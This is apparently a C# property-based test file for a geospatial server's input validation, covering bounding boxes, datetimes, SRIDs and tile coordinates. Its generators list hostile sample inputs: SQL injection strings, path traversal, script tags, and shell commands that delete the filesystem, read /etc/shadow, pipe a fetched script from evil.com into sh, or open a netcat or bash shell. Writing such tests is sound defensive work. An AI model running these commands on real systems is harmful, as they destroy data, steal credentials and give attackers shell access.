using System;
using System.Linq;
using FsCheck;
using FsCheck.Xunit;
using Honua.Server.Host.Ogc;
using Honua.Server.Host.Validation;
using Xunit;

namespace Honua.Server.Core.Tests.Integration.PropertyTests;

/// <summary>
/// Property-based tests for input validation including bounding boxes, datetime, and CRS parameters.
/// </summary>
public class InputValidationPropertyTests
{
    // Bounding Box Validation Tests

    [Property(MaxTest = 500)]
    public Property BoundingBox_ValidCoordinates_ShouldBeWithinBounds()
    {
        return Prop.ForAll(
            GenerateValidBbox(),
            bbox =>
            {
                var (minX, minY, maxX, maxY) = bbox;

                // Min should be less than max
                Assert.True(minX < maxX, $"MinX ({minX}) should be < MaxX ({maxX})");
                Assert.True(minY < maxY, $"MinY ({minY}) should be < MaxY ({maxY})");

                // Should be within WGS84 bounds
                Assert.InRange(minX, -180, 180);
                Assert.InRange(maxX, -180, 180);
                Assert.InRange(minY, -90, 90);
                Assert.InRange(maxY, -90, 90);

                return true;
            });
    }

    [Property(MaxTest = 300)]
    public Property BoundingBox_InvalidCoordinates_ShouldBeDetectable()
    {
        return Prop.ForAll(
            GenerateInvalidBbox(),
            bbox =>
            {
                var (minX, minY, maxX, maxY) = bbox;

                // At least one validation should fail
                var isValid = minX < maxX && minY < maxY &&
                              minX >= -180 && maxX <= 180 &&
                              minY >= -90 && maxY <= 90;

                Assert.False(isValid, "Invalid bbox should be detected");

                return true;
            });
    }

    [Property(MaxTest = 200)]
    public Property BoundingBox_WebMercator_ShouldBeWithinProjectionBounds()
    {
        return Prop.ForAll(
            GenerateWebMercatorBbox(),
            bbox =>
            {
                var (minX, minY, maxX, maxY) = bbox;

                const double webMercatorMin = -20037508.3427892;
                const double webMercatorMax = 20037508.3427892;

                Assert.InRange(minX, webMercatorMin, webMercatorMax);
                Assert.InRange(maxX, webMercatorMin, webMercatorMax);
                Assert.InRange(minY, webMercatorMin, webMercatorMax);
                Assert.InRange(maxY, webMercatorMin, webMercatorMax);

                return true;
            });
    }

    // DateTime Validation Tests

    [Property(MaxTest = 300)]
    public Property DateTime_Iso8601_ShouldParse()
    {
        return Prop.ForAll(
            GenerateValidIso8601DateTime(),
            isoString =>
            {
                var parsed = DateTimeOffset.TryParse(isoString, out var result);

                Assert.True(parsed, $"Valid ISO8601 datetime should parse: {isoString}");
                Assert.NotEqual(DateTimeOffset.MinValue, result);

                return true;
            });
    }

    [Property(MaxTest = 300)]
    public Property DateTime_MaliciousSqlInput_ShouldNotParse()
    {
        return Prop.ForAll(
            GenerateMaliciousDateTimeInput(),
            maliciousInput =>
            {
                var parsed = DateTimeOffset.TryParse(maliciousInput, out _);

                // Malicious input should not parse as valid datetime
                Assert.False(parsed, $"Malicious input should not parse as datetime: {maliciousInput}");

                return true;
            });
    }

    [Property(MaxTest = 200)]
    public Property DateTime_Range_ShouldBeReasonable()
    {
        return Prop.ForAll(
            Arb.Default.DateTimeOffset(),
            dt =>
            {
                // Should be within reasonable range (1900-2100)
                var minDate = new DateTimeOffset(1900, 1, 1, 0, 0, 0, TimeSpan.Zero);
                var maxDate = new DateTimeOffset(2100, 12, 31, 23, 59, 59, TimeSpan.Zero);

                if (dt < minDate || dt > maxDate)
                {
                    // Out of range dates should be identifiable
                    Assert.True(dt < minDate || dt > maxDate);
                }

                return true;
            });
    }

    // CRS/SRID Validation Tests

    [Property(MaxTest = 200)]
    public Property Srid_CommonValues_ShouldBeValid()
    {
        return Prop.ForAll(
            GenerateCommonSrid(),
            srid =>
            {
                // Common SRIDs should be positive
                Assert.True(srid > 0, $"SRID should be positive: {srid}");

                if (srid > 32767)
                {
                    var pseudoCodes = new[] { 900913 };
                    Assert.Contains(srid, pseudoCodes);
                }
                else
                {
                    Assert.InRange(srid, 1, 32767);
                }

                return true;
            });
    }

    [Property(MaxTest = 300)]
    public Property Srid_InvalidValues_ShouldBeDetectable()
    {
        return Prop.ForAll(
            GenerateInvalidSrid(),
            srid =>
            {
                var pseudoCodes = new[] { 900913 };
                var isValid = srid > 0 && (srid <= 32767 || Array.IndexOf(pseudoCodes, srid) >= 0);

                Assert.False(isValid, $"Invalid SRID should be detectable: {srid}");

                return true;
            });
    }

    // Tile Coordinate Validation Tests

    [Property(MaxTest = 500)]
    public Property TileCoordinate_ValidZoomRowColumn_ShouldBeWithinBounds()
    {
        return Prop.ForAll(
            GenerateValidTileCoordinate(),
            coord =>
            {
                var (zoom, row, col) = coord;

                var isValid = OgcTileMatrixHelper.IsValidTileCoordinate(zoom, row, col);

                Assert.True(isValid, $"Valid tile coordinate should be recognized: z={zoom}, r={row}, c={col}");

                // Verify bounds
                var dimension = 1 << zoom;
                Assert.InRange(row, 0, dimension - 1);
                Assert.InRange(col, 0, dimension - 1);

                return true;
            });
    }

    [Property(MaxTest = 300)]
    public Property TileCoordinate_OutOfBounds_ShouldBeInvalid()
    {
        return Prop.ForAll(
            GenerateInvalidTileCoordinate(),
            coord =>
            {
                var (zoom, row, col) = coord;

                var isValid = OgcTileMatrixHelper.IsValidTileCoordinate(zoom, row, col);

                Assert.False(isValid, $"Invalid tile coordinate should be rejected: z={zoom}, r={row}, c={col}");

                return true;
            });
    }

    [Property(MaxTest = 200)]
    public bool ZoomLevel_ShouldParse_WhenValid(int zoom)
    {
        // Only test valid zoom levels
        if (zoom < 0 || zoom > 30)
            return true; // Skip invalid values

        var zoomString = zoom.ToString();
        var parsed = OgcTileMatrixHelper.TryParseZoom(zoomString, out var result);

        Assert.True(parsed);
        Assert.Equal(zoom, result);

        return true;
    }

    [Property(MaxTest = 200)]
    public bool ZoomLevel_ShouldReject_WhenInvalid(string zoomString)
    {
        if (string.IsNullOrWhiteSpace(zoomString))
        {
            return true;
        }

        var parsed = OgcTileMatrixHelper.TryParseZoom(zoomString, out var result);

        if (parsed)
        {
            // If it parses, should still be non-negative
            Assert.True(result >= 0);
        }

        return true;
    }

    // Command Injection Prevention Tests

    [Property(MaxTest = 300)]
    public Property ShellCommand_Characters_ShouldBeDetected()
    {
        return Prop.ForAll(
            GenerateCommandInjectionAttempt(),
            maliciousInput =>
            {
                // Check for shell metacharacters
                var hasMetaChars = maliciousInput.Any(c =>
                    c == ';' || c == '|' || c == '&' || c == '$' ||
                    c == '`' || c == '>' || c == '<' || c == '\n' || c == '\r');

                if (hasMetaChars)
                {
                    Assert.True(hasMetaChars, "Shell metacharacters should be detected");
                }

                return true;
            });
    }

    // FsCheck Generators

    private static Arbitrary<(double, double, double, double)> GenerateValidBbox()
    {
        var gen = from minX in Gen.Choose(-179, 179).Select(x => (double)x)
                  from minY in Gen.Choose(-89, 89).Select(y => (double)y)
                  from width in Gen.Choose(1, 180 - (int)minX).Select(w => (double)w)
                  from height in Gen.Choose(1, 90 - (int)minY).Select(h => (double)h)
                  select (minX, minY, minX + width, minY + height);

        return Arb.From(gen);
    }

    private static Arbitrary<(double, double, double, double)> GenerateInvalidBbox()
    {
        var invalidPatterns = new[]
        {
            (181.0, 0.0, 180.0, 10.0),      // minX > 180
            (0.0, 91.0, 10.0, 90.0),        // minY > 90
            (10.0, 10.0, 0.0, 20.0),        // minX > maxX
            (10.0, 20.0, 20.0, 10.0),       // minY > maxY
            (-181.0, 0.0, 0.0, 10.0),       // minX < -180
            (0.0, -91.0, 10.0, 0.0),        // minY < -90
            (double.NaN, 0.0, 10.0, 10.0),  // NaN
            (0.0, 0.0, double.PositiveInfinity, 10.0), // Infinity
        };

        return Arb.From(Gen.Elements(invalidPatterns));
    }

    private static Arbitrary<(double, double, double, double)> GenerateWebMercatorBbox()
    {
        const double webMercatorMax = 20037508.3427892;

        var gen = from minX in Gen.Choose(-20000000, 19999000).Select(x => (double)x)
                  from minY in Gen.Choose(-20000000, 19999000).Select(y => (double)y)
                  from width in Gen.Choose(1000, 1000000).Select(w => (double)w)
                  from height in Gen.Choose(1000, 1000000).Select(h => (double)h)
                  select (minX, minY,
                          Math.Min(minX + width, webMercatorMax),
                          Math.Min(minY + height, webMercatorMax));

        return Arb.From(gen);
    }

    private static Arbitrary<string> GenerateValidIso8601DateTime()
    {
        var gen = from year in Gen.Choose(2000, 2030)
                  from month in Gen.Choose(1, 12)
                  from day in Gen.Choose(1, 28)
                  from hour in Gen.Choose(0, 23)
                  from minute in Gen.Choose(0, 59)
                  from second in Gen.Choose(0, 59)
                  select $"{year:D4}-{month:D2}-{day:D2}T{hour:D2}:{minute:D2}:{second:D2}Z";

        return Arb.From(gen);
    }

    private static Arbitrary<string> GenerateMaliciousDateTimeInput()
    {
        var maliciousDates = new[]
        {
            "'; DROP TABLE events--",
            "1' OR '1'='1",
            "../../../etc/passwd",
            "<script>alert(1)</script>",
            "2023-13-45",  // Invalid month/day
            "9999-99-99T99:99:99",
            "' UNION SELECT * FROM users--",
            "2023-01-01'; DELETE FROM logs--",
            "\0\0\0",
            "$(rm -rf /)",
            "`whoami`"
        };

        return Arb.From(Gen.Elements(maliciousDates));
    }

    private static Arbitrary<int> GenerateCommonSrid()
    {
        var commonSrids = new[] { 4326, 3857, 2154, 32632, 32633, 4269, 3395, 900913, 4258, 31370 };
        return Arb.From(Gen.Elements(commonSrids));
    }

    private static Arbitrary<int> GenerateInvalidSrid()
    {
        var gen = Gen.OneOf(
            Gen.Choose(-1000, 0),           // Negative
            Gen.Choose(32768, 100000),      // Too large
            Gen.Constant(int.MinValue),
            Gen.Constant(int.MaxValue)
        );

        return Arb.From(gen);
    }

    private static Arbitrary<(int, int, int)> GenerateValidTileCoordinate()
    {
        var gen = from zoom in Gen.Choose(0, 20)
                  let dimension = 1 << zoom
                  from row in Gen.Choose(0, dimension - 1)
                  from col in Gen.Choose(0, dimension - 1)
                  select (zoom, row, col);

        return Arb.From(gen);
    }

    private static Arbitrary<(int, int, int)> GenerateInvalidTileCoordinate()
    {
        var gen = Gen.OneOf(
            // Negative zoom
            from zoom in Gen.Choose(-10, -1)
            from row in Gen.Choose(0, 100)
            from col in Gen.Choose(0, 100)
            select (zoom, row, col),
            // Row/col out of bounds
            from zoom in Gen.Choose(0, 10)
            let dimension = 1 << zoom
            from row in Gen.Choose(dimension, dimension * 2)
            from col in Gen.Choose(0, dimension - 1)
            select (zoom, row, col),
            // Negative row/col
            from zoom in Gen.Choose(0, 10)
            from row in Gen.Choose(-100, -1)
            from col in Gen.Choose(0, 100)
            select (zoom, row, col)
        );

        return Arb.From(gen);
    }

    private static Arbitrary<string> GenerateInvalidZoomString()
    {
        var invalidZooms = new[]
        {
            "-1",
            "-100",
            "abc",
            "1.5",
            "1e10",
            "'; DROP TABLE--",
            "∞",
            "NaN",
            "",
            "  ",
            "1 OR 1=1"
        };

        return Arb.From(Gen.Elements(invalidZooms));
    }

    private static Arbitrary<string> GenerateCommandInjectionAttempt()
    {
        var commandInjections = new[]
        {
            "; rm -rf /",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(uname -a)",
            "; cat /etc/shadow",
            "| nc attacker.com 4444",
            "; curl http://evil.com/shell.sh | sh",
            "&& wget http://malicious.com/backdoor",
            "; python -c 'import os; os.system(\"ls\")'",
            "|| cmd.exe /c dir",
            "; powershell.exe -Command \"Get-Process\"",
            "`curl http://evil.com`",
            "$(wget -O - http://attacker.com/script.sh)",
            "; /bin/bash -i",
            "| /bin/sh",
            "> /etc/hosts"
        };

        return Arb.From(Gen.Elements(commandInjections));
    }
}
